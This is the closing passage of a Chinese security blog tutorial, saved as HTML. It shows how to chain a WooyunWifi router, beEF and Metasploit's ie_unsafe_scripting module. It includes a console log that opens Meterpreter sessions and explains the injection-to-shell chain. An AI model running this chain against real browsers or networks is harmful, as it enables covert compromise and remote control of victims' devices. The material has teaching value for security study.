+   ICON  NOyes   Icon type can be NO, ERROR, INFORMATION, WARNING or QUESTION
+   TEXT  Hello, from MSF!  yes   Messagebox Text (max 255 chars)
+   TITLE MessageBoxyes   Messagebox Title (max 255 chars)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows x86/x64
+
+
+msf exploit(ie_unsafe_scripting) &gt; set URIPATH /a
+URIPATH =&gt; /a
+msf exploit(ie_unsafe_scripting) &gt; exploit
+[*] Exploit running as background job.
+msf exploit(ie_unsafe_scripting) &gt; 
+[*] Using URL: http://192.168.1.163:8080/a
+[*] Server started.
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+
+msf exploit(ie_unsafe_scripting) &gt; set TECHNIQUE Powershell
+TECHNIQUE =&gt; Powershell
+msf exploit(ie_unsafe_scripting) &gt; rerun
+[*] Stopping existing job...
+
+[*] Server stopped.
+[*] Reloading module...
+[*] Exploit running as background job.
+
+msf exploit(ie_unsafe_scripting) &gt; [*] Using URL: http://192.168.1.163:8080/a
+[*] Server started.
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
+[*] Sending stage (972288 bytes) to 192.168.1.134
+[*] Meterpreter session 1 opened (192.168.1.163:4446 -&gt; 192.168.1.134:63098) at 2015-08-09 19:49:09 +0800
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
+[*] Sending stage (972288 bytes) to 192.168.1.134
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
+[*] Meterpreter session 2 opened (192.168.1.163:4446 -&gt; 192.168.1.134:63099) at 2015-08-09 19:49:37 +0800
+Interrupt: use the 'exit' command to quit
+msf exploit(ie_unsafe_scripting) &gt; set payload windows/messagebox
+payload =&gt; windows/messagebox
+msf exploit(ie_unsafe_scripting) &gt; rerun
+[*] Stopping existing job...
+
+[*] Server stopped.
+[*] Reloading module...
+[*] Exploit running as background job.
+msf exploit(ie_unsafe_scripting) &gt; 
+[*] Using URL: http://192.168.1.163:8080/a
+[*] Server started.
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript
+[*] 192.168.1.134ie_unsafe_scripting - Request received for /a
+[*] 192.168.1.134ie_unsafe_scripting - Sending exploit html/javascript</span></pre><p><span style="font-size: 14px;">为了节省空间，上面演示的命令中我把我敲错的命令都自己删掉了 ：）</span></p><p><span style="font-size: 14px;">首先你在Metasploit里面要开启一个Browser Exploit的module，可能为了方便你喜欢手动设置uri为/a，payload可以是reverse shell，这里为了演示用的是MessageBox弹窗</span></p><p><span style="font-size: 14px;">然后在beEF里面让目标浏览器跳转至你的Browser Exploit的uri中，如图：</span></p><p><img title="2222" class="alignnone size-full wp-image-7881" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBLxsCOQgq7omuqD3RvxyqF21uezB76smJ3tQp7FzLr4ian3ML3BkiaZHA/0?wx_fmt=png" data-type="png" data-ratio="0.5623762376237624" data-w="" src="../Images/8146bf348a6556f5f6635e8bd6bb54db.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBLxsCOQgq7omuqD3RvxyqF21uezB76smJ3tQp7FzLr4ian3ML3BkiaZHA/0?wx_fmt=png"/></p><p><span style="font-size: 14px;">之后目标浏览器就会访问我们设置好的Metasploit Browser Exploit页面，触发漏洞：</span></p><p><img title="hellomsf" class="alignnone size-full wp-image-7882" data-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBanjsSpian71lmTl94vibdQBafUv9oPVf6SkcV2ibr977XCODe3ng3V0IA/0?wx_fmt=png" data-type="png" data-ratio="0.497029702970297" data-w="" src="../Images/5172dce7591b47a8ced60f4c4bed4b9c.png" data-original-src="http://mmbiz.qpic.cn/mmbiz/3xxicXNlTXLiccVvJ7jEBud0e5zoOXJfPBanjsSpian71lmTl94vibdQBafUv9oPVf6SkcV2ibr977XCODe3ng3V0IA/0?wx_fmt=png"/></p><h1><span style="font-size: 14px;">0x05 Browser Exploit组合原理科普</span></h1><hr/><p><span style="font-size: 14px;">首先，看看我们做了一件什么事情：</span></p><p><span style="font-size: 14px;">目标设备发出浏览网页请求-&gt;WooyunWifi路由器不作改动-&gt;网站服务器-&gt;网站响应发回WooyunWifi路由器-&gt;WooyunWifi路由器在JS文件中插入写标签代码-&gt;WooyunWifi将修改后的响应发回目标设备-&gt;目标设备执行写标签代码-&gt;目标设备通过html标签加载并执行了安全测试设备上的hook.js代码-&gt;hook.js代码与安全测试设备上的beEF进行交互式的操作-&gt;beEF准备指令hook.js跳转至安全测试设备上的Metasploit Browser Exploit uri-&gt;目标设备当前页面受hook.js控制跳转至安全测试设备上的Metasploit Browser Exploit uri-&gt;Metasploit准备并发送浏览器攻击代码-&gt;目标设备浏览器被攻击后执行后门代码-&gt;目标设备后门代码与安全测试设备上的Metasploit进行交互-&gt;GETSHELL成功</span></p><p><span style="font-size: 14px;">那么，什么是Browser Exploit呢？Browser Exploit就是利用浏览器的漏洞来渗透目标设备的方法，常见的比如ie的漏洞都可能导致目标设备在访问恶意页面后直接被GETSHELL，另外其他的比如Flash漏洞也都是可以通过浏览器来触发的，因此也可纳于Browser Exploit范畴</span></p><pre class="highlight"><span style="font-size: 14px;">Metasploit的浏览器攻击方式为建立一个uri以供目标设备访问，之后对特定的uri执行特定的漏洞利用模块
+
+而beEF可以收集浏览器的信息，比如版本、插件、安全设置等等，可以根据beEF的信息选择Metasploit所要选择的漏洞利用模块
+
+WooyunWifi可以使目标设备的浏览器毫无痕迹地执行hook.js，这样可以与beEF进行交互，再由beEF指令目标设备跳转至Metasploit uri</span></pre><h1><span style="font-size: 14px;">0x06 结语</span></h1><hr/><p><span style="font-size: 14px;">WooyunWifi不是一个黑客路由器，它只是一个用来研究、学习、交流的集成测试平台，请自觉遵守相关法律法规。该路由器仅在乌云集市中以平台积分形式赞助给在乌云平台上做过卓越贡献的白帽子，我们认为这些白帽子具备合格的安全知识能力及职业道德素质，兑换该路由器即保证仅用于学习研究用途。</span></p><p><span style="font-size: 14px;">那么，目标设备是怎么连上WooyunWifi的呢？破解WPA/WPA2握手包 + 5种方式秒杀无客户端连接嗅探不到包的WEP + 半握手包破解 + WPS在线暴力/pixie dust离线破解WPS-PIN + de-authentication掉线攻击 + KARMA混杂响应劫持手机扫描 + 利用大数据制作更好的弱密码字典，欲知后事如何 且听下回分解~</span></p><p><br/></p>
+        
+</body>
+</html>
